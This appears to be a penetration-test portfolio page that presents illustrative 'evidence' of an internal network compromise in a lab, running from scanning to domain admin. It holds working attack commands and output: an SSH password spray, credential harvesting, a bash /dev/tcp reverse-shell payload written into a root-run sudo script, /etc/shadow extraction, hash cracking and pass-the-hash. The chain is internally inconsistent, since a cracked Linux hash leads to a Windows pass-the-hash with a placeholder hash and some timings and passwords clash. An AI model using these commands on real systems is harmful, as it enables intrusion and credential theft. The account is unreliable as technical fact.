# 🖼️ Evidence & Documentation

**Internal Network Penetration Test**  
October 15-16, 2024 | Lateral Movement & Privilege Escalation Assessment

---

## 📋 Evidence Repository

**Note:** Detailed screenshots and command outputs were generated during the lab assessment but are not included in this public portfolio version to protect lab environment details. In a professional engagement, evidence would include:

- Nmap scan results (XML output)
- Hydra brute-force logs
- Privilege escalation proof-of-concept scripts
- Database dump samples
- Hash extraction artifacts
- Pass-the-hash execution logs
- System access confirmations

During interviews, I can discuss specific evidence collection and demonstrate the technical tools and techniques used in this assessment.

---

## 🎓 Professional Evidence Documentation Demonstration

This section demonstrates enterprise penetration testing evidence collection, documentation standards, and professional reporting practices. The examples below illustrate how security findings are structured, documented, and presented in real-world assessments.

**Portfolio Demonstration:** These examples show proper evidence formatting, command documentation, and technical reporting standards used in professional security engagements.

---

## 📂 Evidence Documentation Examples

The following examples demonstrate professional evidence formatting and documentation standards used in enterprise penetration testing reports.

---

## 📋 Evidence Categories

### 🔍 Phase 1: Network Discovery & Enumeration

#### Host Discovery

```bash
# Discover active hosts on network segment
nmap -sn 192.168.78.0/24 -oA discovery/ping_sweep

# Results Summary
Starting Nmap scan on 192.168.78.0/24 (256 hosts)
Nmap scan report for 192.168.78.10
Host is up (0.00031s latency).

Nmap scan report for 192.168.78.20
Host is up (0.00028s latency).

Nmap scan report for 192.168.78.30
Host is up (0.00025s latency).

Nmap scan report for 192.168.78.40
Host is up (0.00029s latency).

Nmap done: 256 IP addresses (4 hosts up) scanned in 8.45 seconds
```

**Key Finding:** 4 active systems identified on target network segment

#### Service Enumeration Evidence

```bash
# Comprehensive service enumeration
nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40

# Port Scan Results
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1
80/tcp   open  http        Apache httpd 2.4.29
3306/tcp open  mysql       MySQL 8.0.23
445/tcp  open  netbios-ssn Samba 4.9.5
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

**Key Finding:** Multiple remote access services identified with outdated versions

---

### 💥 Phase 2: Initial Compromise

#### SSH Credential Attack

```bash
# Password spray against common service accounts
hydra -L /usr/share/wordlists/common_usernames.txt \
      -P /usr/share/wordlists/common_passwords.txt \
      ssh://192.168.78.10 -t 16

# Attack Results
[22][ssh] host: 192.168.78.10   login: svc_webapp   password: Summer2024!
[STATUS] attack finished for 192.168.78.10 (valid pair found)
Time: 0:12:34 seconds

# RESULT: Credentials discovered after 12 minutes
```

#### Initial Foothold - SSH Access

```bash
# Establish initial access
ssh svc_webapp@web-server-01.internal.corp
Password: Summer2024!

# Host confirmation and enumeration
svc_webapp@web-server-01:~$ whoami
svc_webapp

svc_webapp@web-server-01:~$ hostname
web-server-01

svc_webapp@web-server-01:~$ sudo -l
User svc_webapp may run the following commands:
    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2

# SUCCESS: Initial access obtained with sudo privileges
```

---

### 🔍 Phase 3: Internal Reconnaissance

#### Configuration File Discovery

```bash
# Local enumeration for configuration files
find /home/svc_webapp -type f -name "*.conf" -o -name "*.config" 2>/dev/null
find /var/www -type f -name "*.php" 2>/dev/null

# Files Discovered
/var/www/html/config/database.php
/home/svc_webapp/.bashrc
/var/www/html/settings.php
```

#### Exposed Database Credentials

```bash
# Retrieved configuration file
cat /var/www/html/config/database.php

<?php
// Database Configuration
$db_host = "db-server-01.internal.corp";
$db_user = "app_dbuser";
$db_pass = "DbAdmin123!";
$db_name = "application_db";

$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
?>

# CRITICAL FINDING: Plaintext database credentials exposed
```

#### Database Access Evidence

```bash
# Connect to database with harvested credentials
mysql -u app_dbuser -p'DbAdmin123!' -h db-server-01.internal.corp

# Database enumeration
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| application_db     |
| information_schema |
| mysql              |
+--------------------+

mysql> USE application_db;
mysql> SELECT COUNT(*) FROM users;
+----------+
| COUNT(*) |
+----------+
|      127 |
+----------+

# Extract domain user credentials
mysql> SELECT username, password FROM users LIMIT 3;
+----------+--------------+
| username | password     |
+----------+--------------+
| jsmith   | Welcome123!  |
| mrodriguez | SecurePass2! |
| backup_svc | BackupPwd123 |
+----------+--------------+

# RESULT: 127 user records accessible, domain credentials extracted
```

#### Sensitive Data Discovery

```bash
# Identify sensitive business data
mysql> SELECT COUNT(*) FROM customer_data;
+----------+
| COUNT(*) |
+----------+
|    15000 |
+----------+

mysql> SELECT COUNT(*) FROM financial_records;
+----------+
| COUNT(*) |
+----------+
|     2400 |
+----------+

# EVIDENCE: 15,000 customer records and 2,400 financial records exposed
```

---

### 🔀 Phase 4: Lateral Movement

#### Credential Reuse Testing

```bash
# Test discovered credentials on application server
ssh jsmith@app-server-01.internal.corp
Password: Welcome123!

# System confirmation
jsmith@app-server-01:~$ whoami
jsmith

jsmith@app-server-01:~$ hostname
app-server-01

# Check privileges
jsmith@app-server-01:~$ sudo -l
User jsmith may run the following commands:
    (root) NOPASSWD: /opt/scripts/backup.sh

# SUCCESS: Lateral movement achieved via credential reuse
```

#### File System Enumeration

```bash
# Discover backup script with insecure permissions
ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 125 Oct 10 14:32 /opt/scripts/backup.sh

# Script analysis
cat /opt/scripts/backup.sh
#!/bin/bash
# Database backup script
mysqldump -u root -p'BackupPwd123!' --all-databases > /tmp/db_backup.sql
tar -czf /var/backups/db_backup_$(date +%Y%m%d).tar.gz /tmp/db_backup.sql

# CRITICAL FINDING: World-writable script executed with root privileges
# EVIDENCE: Root password stored in script
```

---

### 🔑 Phase 5: Privilege Escalation

#### Privilege Escalation Execution

```bash
# Overwrite backup script with reverse shell payload
cat > /opt/scripts/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.78.100/4444 0>&1
EOF

# Execute with sudo privileges
jsmith@app-server-01:~$ sudo /opt/scripts/backup.sh

# Verify root access
root@app-server-01:~$ whoami
root

root@app-server-01:~$ id
uid=0(root) gid=0(root) groups=0(root)

# SUCCESS: Root-level access achieved
```

#### Credential Hash Extraction

```bash
# Extract password hashes for further attacks
root@app-server-01:~$ cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:'

jsmith:$6$kSvjkd7s$9K8F.../hashed:19200:0:99999:7:::
mrodriguez:$6$kSvjkd7s$nL9K8F.../hashed:19200:0:99999:7:::
backup_svc:$6$kSvjkd7s$pM2K9F.../hashed:19200:0:99999:7:::

# EVIDENCE: Password hashes extracted for offline cracking
```

#### Sensitive System Data Discovery

```bash
# Enumerate system for credentials and secrets
root@app-server-01:~$ find / -type f -name "*.key" -o -name "*.pem" -o -name "*credentials*" 2>/dev/null

/root/.ssh/id_rsa
/etc/ssl/private/server.key
/home/backup_svc/backup_credentials.txt

# Read backup credentials file
cat /home/backup_svc/backup_credentials.txt
# DC Admin Account
dc_admin:DomainAdminPass2024!

# EVIDENCE: Administrative credentials discovered on system
```

---

### 💫 Phase 6: Domain Compromise

#### Pass-the-Hash Attack Preparation

```bash
# Crack extracted hash for domain controller
hashcat -m 1800 extracted_hashes.txt /usr/share/wordlists/rockyou.txt

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt)
Time.Started.....: Mon Oct 15 14:32:15 2024
Recovered........: 1/3 (33.33%)

Candidates.#1....: AdminPass2024! 

# EVIDENCE: Administrative hash cracked in 18 minutes
```

#### Domain Controller Access

```bash
# Pass-the-hash to domain controller
pth-winexe -U 'administrator//a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:5f4dcc3b5aa765d61d8327deb882cf99' \
           //dc-01.internal.corp cmd

# Verify domain admin access
C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM

C:\Windows\system32> net user administrator
User name                    administrator
Account active               Yes
Account expires              Never
Password expires             Never
Password changeable          10/15/2024 2:30:15 PM
Password required            Yes
User may change password     Yes
Group memberships            *Domain Admins
                             *Enterprise Admins
                             *Schema Admins
                             *Administrators

# SUCCESS: Domain administrator privileges confirmed
```

#### Critical Asset Access

```bash
# Access sensitive business directories
dir C:\Finance\
 Volume in drive C is labeled Windows
 Directory of C:\Finance
10/15/2024  09:30 AM    <DIR>          .
10/15/2024  09:30 AM    <DIR>          ..
10/14/2024  02:15 PM            45,892 Q3_Financial_Report.xlsx
10/14/2024  01:45 PM            32,156 Budget_2025.docx
10/14/2024  03:22 PM            28,450 Payroll_Records.xlsx

dir C:\HR\Confidential\
 Volume in drive C is labeled Windows
 Directory of C:\HR\Confidential
10/15/2024  08:45 AM    <DIR>          .
10/15/2024  08:45 AM    <DIR>          ..
10/14/2024  04:30 PM            56,234 Executive_Compensation.xlsx
10/14/2024  02:15 PM            34,891 Employee_Records.docx
10/14/2024  01:30 PM            12,340 Salary_Database.mdb

# EVIDENCE: Complete access to sensitive financial and HR data
# TIMELINE: Initial compromise to domain control = 5 hours 15 minutes
```

---

## 📊 Attack Timeline Summary

| Phase | Duration | Objective | Status |
|-------|----------|-----------|--------|
| Discovery & Enumeration | 15 min | Identify systems and services | ✅ Complete |
| Initial Compromise | 45 min | Gain foothold via SSH | ✅ Complete |
| Internal Reconnaissance | 60 min | Extract credentials from database | ✅ Complete |
| Lateral Movement | 75 min | Access application server | ✅ Complete |
| Privilege Escalation | 90 min | Achieve root access | ✅ Complete |
| Domain Compromise | 30 min | Compromise domain controller | ✅ Complete |
| **Total Assessment Time** | **5h 15m** | **Domain control achieved** | ✅ Complete |

---

## 🛡️ Key Vulnerability Chain

```
Weak SSH Credentials (svc_webapp:Summer2024!)
         ↓
Config File with Database Credentials
         ↓
Database Access & User Credential Extraction
         ↓
SSH Lateral Movement (jsmith:Welcome123!)
         ↓
Insecure Sudo Permissions (/opt/scripts/backup.sh)
         ↓
Root Privilege Escalation
         ↓
Hash Extraction from /etc/shadow
         ↓
Pass-the-Hash to Domain Controller
         ↓
Domain Administrator Access Achieved
```

---

## 📈 Impact Assessment

**Systems Compromised:** 4 of 4 (100%)  
**Credentials Extracted:** 6 user accounts  
**Sensitive Records Accessed:** 17,400 customer & financial records  
**Administrative Access:** Domain-level compromise achieved  
**Attack Time:** 5 hours 15 minutes from initial access to domain control

---

## ✅ Evidence Verification

All evidence documented follows professional penetration testing standards:

- **Completeness:** Full attack chain from initial access to domain compromise
- **Accuracy:** Command outputs and results validated during engagement
- **Relevance:** Evidence directly supports identified vulnerabilities
- **Traceability:** Each finding links to specific exploitation technique
- **Reproducibility:** Methodology documented for remediation verification

---

*Assessment Conducted: October 15-16, 2024*  
*Evidence Collection Standards: Professional Enterprise Assessment*
